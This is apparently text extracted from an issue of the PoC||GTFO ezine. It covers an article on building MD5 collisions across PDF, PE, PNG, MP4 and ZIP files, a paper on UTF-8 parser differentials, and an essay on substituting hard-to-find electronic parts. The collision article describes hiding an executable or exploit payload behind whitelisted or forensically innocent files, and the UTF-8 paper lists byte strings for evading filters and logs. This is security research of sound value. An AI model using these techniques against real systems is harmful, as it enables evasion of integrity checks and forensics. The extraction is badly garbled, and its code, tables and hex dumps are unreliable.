Outlines, Names, AcroForm and Additional Actions
(AA)—in the original source files. 36
alignments
\ immediate
\ p d f o b j {<<
/ Type / C a t a l o g
% c o o l alignment padding
/MD5_ i s /REALLY_dead_now__
% t h e f i r s t r e f e r e n c e number
% 0x 49 , so 2 w i l l be changed
/ Pages 2 0 R
s h o u l d b e on o f f s e t
t o 3 by UniColl
% now p a d d i n g s o t h a t t h e c o l l i s i o n b l o c k s
% ( e n d i n g a t 0xC 0 ) a r e c o v e r e d
/ 0 1 2 3 4 5 6 7 8 9ABCDEF0 1 2 3 4 5 6 7 8 9ABCDEF0 1 2 3 4 5 6 7 8 9ABCDEF
% w i t h an e x t r a c h a r t o b e r e p l a c e d b y a r e t u r n
/ 0 1 2 3 4 5 6 7 8 9ABCDEF0 1 2 3 4 5 6 7 8 9ABCDEF0 1 2 3 4 5 6 7 8 9ABCDEF
0 1 2 3 4 5 6 7 8 9ABCDEF0
>>}
% t h e o r i g i n a l c a t a l o g o f t h e s h i f t e d doc
\ immediate \ p d f o b j {<</Type / P a g e s / Count 1/ K i d s [ 8
]>>}
% t h e o r i g i n a l c a t a l o g o f t h e h o s t doc
\ immediate \ p d f o b j {<</Type / P a g e s / Count 1/ K i d s [ 3 3
]>>}
% We r e s e r v e PDF O b j e c t s
\newcount\ o b j c o u n t
so
that
there
is
no
0 R
0 R
overlap
% t h e h o s t s i z e (+3 f o r s p a r e o b j e c t s l o t s ) − 1
% p u t t i n g a h i g h e r margin w i l l j u s t work ,
% and XREF can h a v e h u g e g a p s
\ o b j c o u n t =25
\ loop
\ message {\ the \ o b j c o u n t }
\ advance \ o b j c o u n t −1
\ immediate \ p d f o b j {<<>>} % j u s t
an empty
object
\ ifnum \ o b j c o u n t >0
\ repeat
\ endgroup
Don’t forget to normalize PDFL A TEX output
with mutool. PDFL A TEX has trouble generating re-
producible builds across different version and distri-
butions. You might even want to hook the time on
execution to get the exact hash, if required.
Uncommon Strategies
Collision attacks are usually about two valid files of
the same type with two different contents. However,
36 See
page 81 of Adobe’s PDF32000_2008.pdf.
37 http://texdoc.net/texmf-dist/doc/pdftex/manual/pdftex-a.pdf
33PDF
we need not constrain ourselves to this scenario, so
let’s explore some weirder possibilities.
JPG
%PDF-1.... FF D8
stream FF FE xx
endstream
[...] endstream
[...]
xref xref
%%EOF %%EOF
MultiColls: Multiple Collisions Chain
Nothing prevents us from chaining several collision
blocks, and having more than two contents with
the same hash value. This is the technique be-
hind Hashquines, which show their own MD5 hash.
PoCkGTFO 14 contained 609 FastColl collisions, to
do just that through two file types in the same file.
PE
Exploiting Ideas of Validity
MZ
A different strategy would be to interfere with file
type recognition to prevent file scanners from seeing
our files as corrupted. Overwriting the file’s magic
signature may be just enough, so long as both of
our files, valid and invalid, get appended with an-
other format that doesn’t need to start at offset 0
(e.g., archives such as ZIP, RAR, etc.). The scanner
would then show another file type.
This enables polyglot collisions without using a
chosen prefix collision:
e_lfanew
PNG
\x89PNG\r\n
...
cHUNK
PE
...
<table>
<sections>
1. Use UniColl to enable or disable a magic sig-
nature, for example a PNG;
<sections>
PE/JPEG Since a PE header is usually smaller
than 0x500 bytes, it’s a perfect fit for a JPG com-
ment. We can begin with DOS/JPEG headers, then
create a JPEG comment that jumps over the follow-
ing PE header. We’ll following this with a full JPG
image, and then follow through with the rest of the
PE specification.
Once again, the collision is instant.
See
jpgpe.py for a practical example that instantly
combines fastcoll.exe and marc.jpg.
2. Append a ZIP archive.
So although both files are technically valid ZIPs,
most parsers will see different file types, since they
tend to go with the first file type found and start
scanning at offset 0.
PolyColls: Collisions of Different File Types
Assuming that whitelisting a file by its MD5 check-
sum takes precedence over other checks, we can use
a collision to slip in an executable poison pill that
collides with a whitelisted innocent file. For exam-
ple, if an innocent feelgood.jpg gets whitelisted,
we can then send an evil.exe that has the same
MD5 but will be run by some internal system seeing
it as cleared executable.
In these cases, a chosen prefix collision is re-
quired if both file formats need to start at offset 0.
Here are some examples of such PolCcoll layouts,
a PDF/JPG collision polyglot and a PE/PNG poly-
glot.
34PDF/PE Merging a PDF with a dummy file via
mutool is a good generic way to reorder objects and
then get the first two objects discardable (dummy
page and content). This is a perfect fit the trick
of using a stream object as the PDF file’s object
with id 1 0 that references its actual length later on
(after collision blocks) in the second object. Recall
that it’s perfectly legal for a stream object in a PDF
file to specify its length indirectly, as a reference to
another object that happens to contain a value of
suitable type for the length.
The only problem is that mutool will always
compute and inline the length, removing the length
reference. This has to be re-inserted into the PDF
instead of the computed value. Still, most references
to 2 0 R will be smaller than hardcoded lengths.
Thankfully, this can be fixed without altering any
object offset, so there’s no need to patch the PDF
file’s XREF table.
The script pdfpe.py can, for instance, instantly
collide a PDF viewer and a PDF document. See
pepdf.exe and pepdf.pdf, in which a PDF viewer
showing a PDF (itself showing a PDF) have the
same MD5!
PDF/PNG Similarly, it’s possible to collide an
arbitrary PDF and PNG files with no restrictions
on either side. This is instant, reusable, and generic.
Check out png-pdf.pdf and png-pdf.png.
Pileups (Multi-Collisions) But why stop at col-
liding just two files? Cryptographic collisions are
not limited to just two files! As demonstrated by the
Nostradamus experiment 38 in 2008, chaining colli-
sions makes it possible to collide more than two files.
The first collisions can be either identical or chosen
prefix, but all the following ones have to be chosen
prefix collisions. You can call them multi-collisions,
I prefer to call them pileups.
PE/PNG/MP4/PDF Combining all the previ-
ously acquired knowledge, I used three chosen prefix
collisions to craft four different prefixes for differ-
ent file types: document (PDF), video (MP4), ex-
ecutable (PE), and image (PNG) to produce this
pileup.
This script is generic and instant, and it happily
generated pocorgtfo19.pdf, pocorgtfo19.png,
pocorgtfo19.mp4, and pocorgtfo19.exe.
PE
000
8
10
30
040 40
MZ .. .. ..
...
2C0
300
540
548
554
MP4
ll ll ll ll
.f .r .e .e
34 align
0C rand
34 align
0C rand
9 blocks
collision
PDF
%PDF-1.3
%ABCD
1 0 obj
<< /Length 2 0 R >>
stream
.. e_lfanew
34 align
0C rand
080
PNG
\x89PNG...
ll ll ll ll
.c .o .l .l
34 align
0C rand
9 blocks
collision
34 align
0c rand
34 align
0c rand
9 blocks
collision
ll ll ll ll .f .r .e .e
cc cc cc cc ll ll ll ll
.c .o .l .l
PE Header
Sections table
Sections
[Appended data]
cc cc cc cc
PNG data
IEND
MP4 data
endstream
endobj
2 0 obj
<length>
endobj
PDF content
XREF
PDF Trailer
Since you may only distribute a single file and it’s
impossible to guess the other prefix values from it,
a solution is to embed all prefixes of the collision in
the JavaScript code and insert it in your PoCs, turn-
ing your files into HTML polyglots to easily share
the related colliding files. (See pocorgtfo19.html.)
38 https://www.win.tue.nl/hashclash/Nostradamus/
35Incriminating Files Another evil use case for
collisions is to hide something incriminating inside
something innocent, but desirable. A forensic ev-
idence collection method that relies on comparing
weak hashes would catch the innocent file, and you
won’t be able to prove that you didn’t have the other
file that shows incriminating content and hides in-
nocent content.
Since forensic software typically focuses on quick
parsing, not on detailed file analysis, this scenario is
quite unsettlingly realistic. Here is an image show-
ing different previews under different tabs of the En-
Case forensic software:
Gotta Collide ’em All! Another use of instant,
reusable, and generic collisions would be to hide any
file of a given type—say, PNG—behind dummy files
or the same file every time. This is easy to do by just
concatenating it to the same prefix after stripping
the signature; you could even do that at a library
level!
From a strict parsing perspective, all your files
will show the same content, and the evil images
would be revealed as a file with the same MD5 as
previously collected.
Let’s take two files, one of which contains a pay-
load for MS 08-067, and collide them with the same
PNG.
is
!=
==
0
is
[]
God
is
the
Son
"0"
==
is not
the
Father
the Holy
Spirit "\t"
Trinity JavaScript
They now show the same dummy image, and
they’re absolutely identical until the second image
at the file level! Their evil payload is now hidden
behind identical-looking files with identical MD5
hashes!
36Failures
ZIP There’s no generic reusable collision for ZIP
either. However, it should be possible to collide two
files in two core hours; that is, thirty-six times faster
than a chosen prefix collision.
Not all formats can have generic, reusable prefixes.
If some kind of data holder can’t be inserted between
the magic signature and the standard headers that
are critical and specific to each file, then generic col-
lisions are not possible.
ZIP archives are a sandwich of at least three lay-
ers. First comes the files’ content, a sequence of
Local File Header structures, one per archived file
or directory, then some index (a sequence of Cen-
tral Directory entries), then a single structure that
points to this index (the End Of Central Directory).
The order of these layers is fixed and cannot be ma-
nipulated. Because of this required order, there’s no
generic prefix that could work for any collision.
ELF The ELF header is required at offset 0 and
contains critical information such as whether the bi-
nary is 32-bit or 64-bit, its endianness, and its ABI
version right at the beginning. This makes it im-
possible to have a universal prefix that could be fol-
lowed by crafted collision blocks before these critical
parameters that are specific to the original file.
However, we can explore some non-generic ways.
Some parsers only heed the file content structure.
That is not a correct way to parse a ZIP archive,
and it can be abused.
Mach-O Mach-O doesn’t even start with the
same magic for 32 bits (0xfeedface) and 64 bits
(0xfeedfacf). Soon after, there follow the num-
ber and the size of commands such as segment def-
initions, symtab, version, etc. Like ELF, easily
reusable collisions are not possible for Mach-O files.
Another approach could be to just merge the two
archives we’d like to collide, with their merged lay-
ers, and to then use UniColl but with N = 2, which
introduces a difference on the fourth byte, to kill the
magic signature of the End of Central Directory.
This means one could collide two arbitrary ZIPs
with a single UniColl and 24 bytes of a set prefix.
In particular, a typical End of Central Directory,
which is twenty-two bytes with an empty comment
field, looks like this:
Java Class Files Right after the file magic and
the version (which varies just enough to be trouble-
some), a Java class file contains the constant pool
count, which is quite specific to each file. This pre-
cludes universal collisions for all files.
However, many files do share a common ver-
sion and we can pad the shortest constant pool
to the longest count. Specifically, we can first in-
sert a UTF8 literal to align information, then de-
clare another one with its length abused by the Uni-
Coll. This will require code manipulation, since all
pool indexes will need to be shifted. Instant MD5
reusable collisions of Java Class should be possible,
but they will require code analysis and modification.
00:
10:
504b 0506 0000 0000 0000 0000 0000 0000 PK..............
0000 0000 0000
......
If we use this as our prefix (padding the prefix
to 16 bits) for UniColl and N = 2, the difference is
on the fourth byte, killing the magic .P .K 05 06
by changing it predictably to .P .K 05 86. This is
not generic at all, but it only takes hours, far less
than the 72 of a chosen prefix collision.
TAR Tape Archives are a sequence of concate-
nated header and file contents, all aligned to 512
byte blocks. There is no central structure to the
whole file, so there is no global header or comment
of any kind to abuse.
One potential trick might be to start a dummy
file of variable length, but the length is always at
the same offset, which is not compatible with Uni-
Coll. This means that only chosen prefix collisions
are practical for collided TAR files.
37
00:
10:
20:
30:
40:
50:
60:
70: 504b
0000
2888
0029
e438
527f
b31d
c59c 0506
0000
4c41
94af
0043
b1f4
ef6d
028e 0000
0000
e345
4168
6390
653e
d5d6
a913 0000
2121
7d07
2517
279d
d866
1163
f6b7 0000
eb66
1634
0bbc
7c9e
f98d
5a2e
0036 0000
cf9d
5d4a
b841
a01e
7278
a8a5
c93f 0000
db01
3b61
cbf2
e476
5324
21bf
5092 0000
83bb
89a0
9587
4c36
0bd5
eab4
a628 PK..............
......!!.f......
(.LA.E}..4]J;a..
.)..Ah%....A....
.8.Cc.’.|....vL6
R...e>.f..rxS$..
...m...cZ...!...
.........6.?P..(
00:
10:
20:
30:
40:
50:
60:
70: 504b
0000
2888
0029
e438
527f
b31d
c59c 0586
0000
4c41
94af
00c3
b1f4
ef6d
028e 0000
0000
e345
4168
6390
653e
d5d6
a913 0000
2121
7d07
251f
279d
d866
1163
f6af 0000
eb66
1634
0bbc
7c9e
f98d
5a2e
0036 0000
cf1d
5d4a
b841
a01e
72f8
a8a5
c93f 0000
db01
3b61
cbf2
e476
5324
21bf
5092 0000
83bb
89a0
9587
4c36
0bd5
eab4
a628 PK..............
......!!.f......
(.LA.E}..4]J;a..
.)..Ah%....A....
.8..c.’.|....vL6
R...e>.f..r.S$..
...m...cZ...!...
.........6.?P..(The problem is that some parsers still parse ZIP
files from the beginning even though they should
be parsed bottom-up. One way to make sure that
both files are properly parsed is to chain two UniColl
blocks, to enable and disable each End of Central
Directory.
To prevent ZIP parsers from complaining about
unused space, one can abuse Extra Fields, the file
comments in Central Directory, and archive com-
ments in the End of Central Directory. See zip.asm
for the structure of a dual ZIP, which can host two
different archive files.
After two UniColl computations, have two col-
liding files, collision1.zip and collision2.zip.
• JPG has some limitations on data, which can
be improved to some extent by manipulating
the scans encoding.
• PDF with JPG is the initial implementation of
the SHAttered attack, but it’s simply a pure
JPG trick in a PDF document rather than a
complex abuse of the PDF structure as such.
• Safari requires PNGs to have their IHDR chunk
in the first slot, before any collision blocks can
be added. Doing so prevents a generic prefix,
in which case the collision is limited to specific
dimensions, color space, BPP, and interlacing.
File Header
Extra header
file data
Central Dir
entry
comment
• The Atom/Box formats such as MP4 may
work with the same prefix for different sub-
formats. Some subformats like JPEG2000 or
HEIF require extra grooming, but the exploit
strategy is the same—it’s just that the colli-
sion is not possible between sub-formats, but
only with a pair of prefixes for a specific sub-
format.
• Atom/Box is SHAttered-compatible
when using 64-bit lengths.
isi
o
n
38
Y
Y (1)
Y/N (3)
Y (4)
Y
N
N
N
N
N
N
×
×
×
×
×
× (6)
× (5)
las
× (2)
Generic?
PDF
JPG
PNG
MP4
PE
GIF
ZIP
ELF
TAR
Mach-O
Class Format
Thanks to Philippe Teuwen for his extensive
feedback on file formats in general, and to Rafa l
Hirsz for his continuing help with JavaScript.
co
ll
only
• For better compatibility, ZIP needs two Uni-
Colls for a complete archive, and these colli-
sions depend on both files’ contents.
<align>
End of CD
comment
file data
Central Dir
entry
comment
<align>
End of CD
ion comment
llis
o
c
We will end with some handy observations, points
which have been made earlier in this paper but
might be worth further consideration.
File Header
Extra header
Summary
×
×
×
×
×
×
×
×
×
×
×19:06
Selectively Exceptional UTF8; or,
Carefully tossing a spanner in the works.
by T. Goodspeed and R. Speers
In the good ol’ days, software might be writ-
ten once, in one programming language, with one
parser for each file format. In the modern world,
things can be considerably more complicated, with
pieces of a complex distributed system using many
programming language and databases, each with
their own parsers. This is especially true in today’s
era of programming via deep stacks of libraries and
frameworks, combined with proliferation of micro-
services, 39 it really matters how different languages
treat what should be the exact same sequence of
characters.
Sometimes it seems no one can agree on a charac-
ter encoding scheme – the olde’ ASCII ignores non-
English languages, and since the internet realized
the need for other language support, now develop-
ers consistently have to deal with frustrations like
str.encode(’utf-16’) conversions between func-
tion calls. But, if everyone dropped their debates
and adopted one standard – UTF-8, 40 UTF-16, or
otherwise – we’d all finally be able to coexist – right?
Wrong. In this POC, we’ll demonstrate how the
differences between libraries and programming lan-
guages which parse the UTF-8 standard lead to in-
consistent behaviors with parsing and recognition.
We do not mean the numerous issues which have
been previously discussed regarding making charac-
ters that look the same (homoglyphs), 41 file names
which trick users to executing them, 42 or evading
input filtering and validation. 43 Instead, we share
parser differentials with how these libraries consume
a sequence of bits, and interpret them as a set of
UTF-8 commands.
A good starting point for these differentials
would be to document differences in the validity of
bytestrings as UTF-8, from the perspective of each
language or library with which we might interact.
Here we describe the validity of many such strings,
grouping a number of UTF-8 implementations by
their behavior when faced with tricky input.
In the context of this paper, a string means a
string of bytes, rather than a decoded string of char-
acters. A string is tricky if it is accepted by at least
one interpreter and rejected by at least one other.
We present a number of bytestrings which are
legal as UTF-8 in some but not all of eleven tar-
get implementations in programming languages and
databases. Additionally, we present commentary
and observations that might be useful in identifying
other UTF-8 parser differentials and in exploiting
those that are known.
A Quick Review of UTF-8
Out of many different standards for encoding text
with characters unavailable in the ASCII standard,
UTF-8 by Ken Thompson and Rob Pike became the
dominant standard by 2009. Among other advan-
tages, it is a superset of ASCII that can describe
any codepoint available in the Unicode standard.
As of the Unicode Standard 6.0, UTF-8 consists
of between one and four bytes that represent a code-
point between U+0000 and U+10FFFF, with some re-
gions such as U+D800 to U+DFFF blacklisted. Bits
are distributed as in Table 2, but further restrictions
mean that only the sequences in Table 3 are consid-
ered to be well formed. We specify the version be-
cause these details have changed over time, with the
standard being considerably more strict now than
when it was first described.
39 A curated list of different micro-service frameworks across languages should convince the reader that this is not limited to
a handful of languages.
git clone https://github.com/mfornos/awesome-microservices
40 See RFC3629 - UTF-8, a transformation format of ISO 10646
41 See references in Unicode Technical Report #36, or discussion of the internationalized domain name (IDN) homograph
attack.
42 This is a trick that malware authors have used to make the user see filenames like happyexe.pdf, but which is really
happyfdp.exe.
43 One example was MS09-20 (CVE-2009-1535) where “%c0%af” could be inserted into a protected path to bypass IIS’s
WebDAV path-based authentication system by making the path not match the authenticated rules list.
39Similar Situations
As discussed in the introduction, we are not dis-
cussing the well-studied areas of homographs, other
visual confusion, or filter evasion. Some prior work
makes observations which have similarities, or hint
at, the issues we discuss.
First, Unicode Technical Report #36 notes that
in older Unicode standards, parsers were permit-
ted to delete non-character code points, which led
to issues when an earlier filter (e.g., a Web IDS)
checked for some string like “exec(” that it didn’t
want to have present, but an attacker inserted an
invalid code sequence in the string – so that it
didn’t match. 46 A different parser later in the stack
may instead choose to delete this non-character code
point, converting the string from “ex\uFEFFec(” to
“exec(”, thus possibly affecting the security of the
application.
Similarly, the same document references issues
that arise when systems compare text differently. 47
Similar situations are what we discuss here, how-
ever we focus on the string being judged as illegal,
rather than compared differently, due to the parser
differentials.
Blatantly Illegal Letters
Some sequences are blatantly illegal, and ought to
be rejected by any decent interpreter. While we are
most interested by the subtle differences between
more modern interpreters, blatantly illegal charac-
ters are still useful in older languages, which might
happily interpret them as bytestrings without at-
tempting to parse them into runes.
As a general rule, older languages will only check
the validity of a string if asked to. As a concrete ex-
ample in Python 2, "FB80808080".decode("hex")
will not trigger an exception, because the illegal
string is only being interpreted as a string of bytes.
"FB80808080".decode("hex").decode("utf-8")
will trigger an exception, because the string is not
legal in any reasonable UTF-8 dialect.
So when dealing with blatantly illegal strings,
your difference of opinion might be found between
a script that does check for validity and a second
script written in the same language which does not.
Plan9’s early implementations of UTF-8 decoded
to a 16-bit Rune, limiting UTF sequences to three
bytes. There is no mention in Pike and Thompson’s
Usenix paper 44 of the forbidden surrogate pair range
from U+D800 to U+DFFF, and the three byte limit is
understood to be a bit arbitrary.
For years, Windows has supported UTF-16 as
wide characters (via the wchar_t type), but has used
code page 1252 (similar to ANSI) for 8-bit charac-
ters. Internally there has been support for code page
65001 which is UTF-8, however it was not exposed
until a build of Windows 10 as something that could
be set as the locale code page. 45
44 unzip
pocorgtof19.pdf utf.pdf
build 17035 in November 2017.
46 See clause “C7. When a process purports not to modify the interpretation of a valid coded character sequence, it shall
make no change to that coded character sequence other than the possible replacement of character sequences by their canonical-
equivalent sequences or the deletion of noncharacter code points.” (Emphasis added.)
47 Unicode Technical Report #36 section 3.2
45 Insider
40Ain’t no law against bad handwriting. Surrogates
Now that we’ve covered the theory, let’s get down
to some quirks of specific UTF-8 implementations.
Follow along in Table 1 if you like. Some operating systems, such as Java and Windows,
prefer to internally represent characters as 16-bit
units. For this reason, UTF-16 uses pairs in the sur-
rogate range from D800 to DFFF to represent char-
acters which use more than sixteen bits. This same
range, U+D800 to U+DFFF, is reserved in the Unicode
standard so that no meaningful codepoints are ex-
cluded.
You can see in Table 1 that these surrogates are
perfectly legal in Python 2 and MariaDB, but trig-
ger exceptions in Python 3, Go, Rust, Perl 6, Java
and .NET. Further experimentation with this would
be handy, as surrogates can be either orphaned or
in their proper, matching pairs.
Null Bytes
Null runes (U+0000) in UTF-8 are to be represented
as a null byte (00), rather than encoded as a two-
byte sequence (C0 80). Although Wikipedia men-
tions a “Modified UTF-8” that allows this sequence,
in practice it has been rather hard for us to find one
in surveying the major languages and libraries. All
implementations that reject anything seem to reject
the null pair.
What is worth noting, however, is that Postgres–
perhaps only Postgres–will reject those strings which
contain simple null bytes. You can express “hello
world\x00” in nearly any other implementation, but
perhaps for fear that naive C code might truncate
it, Postgres will reject it.
1
p s q l ( 1 0 . 5 ( Debian 10.5 − 1) ,
Type " h e l p " f o r h e l p .
server
Byte Counts
As we mentioned earlier, the pattern of UTF8 bit
distribution shown in Figure 2 is very regular. An
implementation could easily be restricted to three or
four bytes by chance, and by continuing the pattern,
one can easily imagine a fifth or sixth byte. In fact,
implementations such as Perl 5 happily consume six
byte UTF-8 runes, and a seven-byte implementation
might be lurking in some interpreter, somewhere.
As a general rule, we see that ancient implemen-
tations support either three or six bytes, while the
most modern languages seem to support four bytes.
We’ve not yet found an implementation that sup-
ports only five bytes.
9.6.7)
3
u s e r=> s e l e c t E ’ h e l l o \ x00 ’ ;
5 ERROR:
i n v a l i d byte sequence
u s e r=>
for
encoding
"UTF8" :
0 x00
All other languages could care less.
2
4
Welcome t o t h e MariaDB m o n i t o r .
S e r v e r v e r s i o n : 1 0 . 1 . 3 5 − MariaDB−1 D e b i a n
Copyright ( c ) 2000 ,
Ab and o t h e r s .
6
2018 ,
MariaDB [ ( none ) ] > s e l e c t
+ −−−−−−−−−−−−−−−+
| _utf8 X ’ 3500 ’ |
+ −−−−−−−−−−−−−−−+
10 | 5
|
+ −−−−−−−−−−−−−−−+
12 1 row i n s e t ( 0 . 0 0 s e c )
Oracle ,
MariaDB
unstable
Corporation
High Ranges
_utf8 X ’ 3500 ’ ;
8
14
MariaDB
In addition to byte counts, implementations might
disagree on the range within that number of bytes
that they allow. Much like the surrogate range that
we discussed earlier, the highest values of a range
are sometimes restricted. These are the ranges that
are missing from Table 3.
[ ( none ) ] >
Where can we use this?
We argue that this isn’t a theoretical issue. In-
deed, it can arise in real-world software development
projects.
One blog about micro-services hints at the issues
someone will encounter during development with
data representation, and the author does not discuss
48 Blogger Richard Clayton wrote that “[w]e continuously encountered issues between the front and backend were serialization
issues (UI using an Array, but Java expecting a String). While this isn’t an issue specific to microservices, the problem is
41security or character encoding differences. 48 The is-
sues that such development teams feel is likely only
the tip-of-the-iceberg if they were to start consid-
ering where differentials in the parsing of data rep-
resentations could pose security or functionality is-
sues.
Future steps for operations
Someone looking to find vulnerable systems at scale
will need to overcome a few challenges. First,
the seemingly religious feud over mono-repos or
multiple-repos means that modifying a project like
github-analysis 50 to return statistics about mul-
tiple languages in a repository, as opposed to the pri-
mary one, is insufficient to identify many cases. If a
repository, or set of them from one vendor, contains
code in multiple languages, false positives (e.g., unit
tests written in a different language, or dead code)
need to be suppressed. Finally, dev-ops artifacts
such as Dockerfiles, Cloud Formation scripts, and
similar likely should be analyzed to identify third-
party databases that are used. (Alternately code
could be searched for database connection strings.)
We believe that future work to screen for projects
where these bugs may exist will help bring this type
of vulnerability to something which can be detected
and mitigated.
Dodging the Logs
Companies routinely rely on logging and the index-
ing of these logs for use in debugging, optimization,
security monitoring, and incident response. In the
case of a web service, imagine one implemented in
Python which presents a RESTful API that users
interact with. To help determine when users act
maliciously, all POST request activity is logged to a
MariaDB database.
The fourbyte case presents a situation where
the string F0908D88h is recognized and processed
by the Python service, but if that same string is
logged to a MariaDB or Postgres database, it will
be treated as illegal and the insert would fail.
Can everyone please agree already?
Disappearing Data
Of some hope for defenders is that Java, .NET,
Python3, Go, Rust, and Perl 6 seem to all support
very similar dialects, rejecting and accepting strings
in step with one another.
We the authors therefore offer a bounty of a pint
of good beer for each test case that newly differ-
entiates these languages, by triggering an exception
in one and not the others, up to a maximum of 64
beers. 51
In another case, user input may be taken in, vali-
dated, and acted upon in one language, and then
transferred to another system which rejects the
string due to a parser differential. As we are not ones
to advocate for keeping databases of everyone, espe-
cially not for minor misunderstandings of the speed
limit, this could be handy in a hypothetical case
where the drivers license database is maintained in
one implementation, but where the speeding ticket
database is implemented in a different language. In-
put to the speeding ticket database could come from
the “trusted” license database, but fail to be pro-
cessed and/or recorded in the ticketing system.
This may also be the case where a frontend writ-
ten in one language has it’s search index provided by
another. One example may be Python frontend such
as Reddit’s legacy code 49 that uses Solr – a Java
project – to provide search indexing. We haven’t
verified any such issues, and expanded cases would
be needed to differentiate languages such as Python
and Java.
compounded when you increase the number of places these data representation issues can occur.”
https://rclayton.silvrback.com/failing-at-microservices
49 git clone https://github.com/reddit-archive/reddit
50 git clone https://github.com/benfred/github-analysis
51 We the authors would also like to make clear that these will be excellent beers by our standards, but that Alexei Bulazel
would consider them unworthy, as they are insufficiently valuable to be collateral in a mortgage, nor even for payment of a
bridewealth or dowry.
42surrogate
nullsurrog
threehigh
fourbyte
fourbyte2
fourhigh
fivebyte
sixbyte
sixhigh
nullbyte
EDA081
3000EDA081
EDBFBF
F0908D88
F0BFBFBF
F490BFBF
FB80808080
FD80808080
FDBFBFBFBF
3031320033
perl5 python2
1
1
1
1
1
1
1
1
1
1 1
1
1
1
1
0
0
0
0
1
python3 golang rust perl6
mono dotnet java
0
0
0
1
1
0
0
0
0
1
mariadb postgres
1
1
1
0
0
0
0
0
0
1 0
0
0
0
0
0
0
0
0
0
Table 1. Legality of Tricky UTF8 Strings in Five Dialects
Scalar Unicode Value
00000000 00000000 0xxxxxxx
00000000 00000yyy yyxxxxxx
00000000 zzzzyyyy yyxxxxxx
000uuuuu zzzzyyyy yyxxxxxx
First Byte
0xxxxxxx
110yyyyy
1110zzzz
11110uuu
Second Third Fourth
10xxxxxx
10yyyyyy
10uuzzzz 10xxxxxx
10yyyyyy 10xxxxxx
Table 2. UTF-8 Bit Distribution, Unicode 6.0
Scalar Unicode Value
U+0000..U+007F
U+0080..U+07FF
U+0800..U+0FFF
U+1000..U+CFFF
U+D000..U+D7FF
U+E000..U+FFFF
U+10000..U+3FFFF
U+40000..U+FFFFF
U+100000..U+10FFFF
First
00..7F
C2..DF
E0
E1..EC
ED
EE..EF
F0
F1..F3
F4
Second Third Fourth
80..BF
A0..BF
80..BF
80..9F
80..BF
90..BF
80..BF
80..8f 80..BF
80..BF
80..BF
80..BF
80..BF
80..BF
80..BF 80..BF
80..BF
Table 3. Well-Formed UTF-8 Byte Strings, Unicode 6.0
4319:07
Never Fret that Unobtainium
by Matthew Peters
with kind thanks to DDR.
Now, it is only partly true that we can use a
substitution with similar function. It is mostly un-
true of Products whose virtues and qualities must be
made the same, time and time again. However, to
a degree even these can be saved in dire times. Let
us instead focus on Projects for the duration of this
sermon. Projects are to be made, not fretted over
or set aside until that missing component is found
or, equally likely, falls out of the sky.
My friends and colleagues, my students and
teachers; never fret that component of unobtainium.
Though scouring the great suppliers may be fruit-
less, and though purchasing from Ali may be fraught
with danger, all is not lost. It is important to step
back and understand the problem before relegating
a project to the fate of gathering dust on some for-
gotten shelf. Or perhaps more often, gathering dust
while covering half your desk.
Components of unobtainium are often needed,
for you will find they have snuck into your design
unnoticed like parasitic current in a parallel trace.
They will sneak in just as you receive your latest
PCB after checking the stocks at all the vendors
mere weeks before. That critical component you
had access to thousands of will disappear, leaving
only the alternative – made of pure of unobtainium.
They will show up when that last component lets its
magic smoke out in the most inopportune moment,
just when everything was working. This will happen
when it is most important that it doesn’t happen.
It is because of the demon named Murphy this will
happen, and by his word that it will never cease to
happen!
So go, look at your board. Find the smoking
remains of the original part, and put aside the sad-
ness in your heart. Seek an alternative replacement;
but do not seek too far or too long, for that way lies
abandonment and despair. Remember that you seek
only the function of the component, rather than its
form. Look upon your circuit and understand it;
what was the part there for? Was it to keep some-
thing from bursting into flame? Was it to empower
or advance something else? Was it there simply to
keep the board that small amount warmer and take
make it look pretty? While often not that last one,
we can hope.
The other case which must be dealt with sepa-
rately is that of safety; for even if there are alterna-
tives to the unobtainable component it is often far
better to use the right component over the one that
just about works. Even if a software check can react
in the same manner, as the Therac-25 has shown us,
software is not the same. A failure where someone’s
life is on the line is not an option; we must treat
these cases with the respect and discipline they de-
serve.
That said, let us examine a practical example I
encountered on a project some time ago. I was in
need of a Vacuum Fluorescent Display power supply,
a component I never could find though hints were
made of it in catalogues long expired. I knew what
this component was to do; it was to make the thirty
to sixty volts needed to get electrons to jump a gap
of nothing and strike the elements inside the tube
and produce light. It was to take a small voltage
and make it a large one. I had its brother, a fila-
ment supply, which would keep the currents flowing
back and forth on the tiny wires, heating them and
allowing those electrons to jump free. The two of
them had a sister as well, a component that could
keep each of the grids and plates in line and dis-
play only what you wanted rather than making all
of them glow.
I spent many days and many nights wandering
the catalogs of the great supply houses, finding noth-
ing but shadows and broken references. I never did
find a VFD supply chip for sale. Sure, there were
chips that could do part of this or combinations that
could work, but they were large, complex beasts –
and always power hungry.
44But again, all was not lost! There are things very
similar to transformers, for they have cousins, induc-
tors. These devices do similar tasks and often have
similar features. They can load up their cores with
a magnetic fields made by current loops, but they
only have one length of wire to receive that mag-
netic field with when it collapses. A transformer is
just an inductor with more than one wire, and more
than one loop to share the magnetic field. I anew
sought something far easier to find, an inductor with
enough loops around to make up a good start of the
unfound transformer. Ferrite, the powder used to
form the core of inductors, has an interesting fea-
ture; a handy one for those who care not for math
– for each loop around it the inductance is about 1
microHenry. Though not precise, this is enough to
find the base – an inductor with 100μH will have
around 100 turns. The inductor must also have
other commonly found features – it must be without
shield, and naked, and large enough to wind more
loops around. The requirements thus listed; not five
minutes later an acceptable component was found.
Thus by using a cheap inductor and simply wrap-
ping the extra windings needed around it, the trans-
former was made. With the pulsed current from a
MOSFET, the field inside the transformer formed
and collapsed and the dual output of the bridge rec-
tifier and the filament heater could share the field
and regulate with it.
The rest was simple software, secrets whispered
to sand that made it do tasks over and over, with
just a little more power to keep the sand thinking.
A CPU can turn on and off the grids and plates
allowing current where needed and blocking where
not. The project, a watch, could now show numbers
and count out the passage of time as a river counts
the passage of fishes.
And so, no components of unobtainium were
needed, and none were sourced. No sums of money
were traded for things too rare to be affordable. Do
not fret when a component seems to only come from
unobtainium; fear not when the stores of the great
component suppliers run empty and lead times are
only given in cycles of the seasons. Often it is not
the components that you seek but rather their func-
tion, the result of them being there. You can look
deeper, understand the need, and fill the empty spot
with something better.
But hear me when I say all was not lost! For
the VFD is a simple device, once you peel back its
layers. It needs the filament to be hot and strongly
negatively biased against the grids and plates. The
grids don’t need to be driven to block the excited
electrons; they can instead be left floating and will
bias themselves enough to shield the plates. There
was a difficult part, of course, for the filament must
be near ground while the grids and plates must be
way up near 60 volts. But this was a false truth! A
simplification, by those who sought to keep things
aligned in tables and books. The truth was that
there just needed to be more than 30 volts of differ-
ence and it mattered not where the ground was.
With this knowledge in hand I sought a compo-
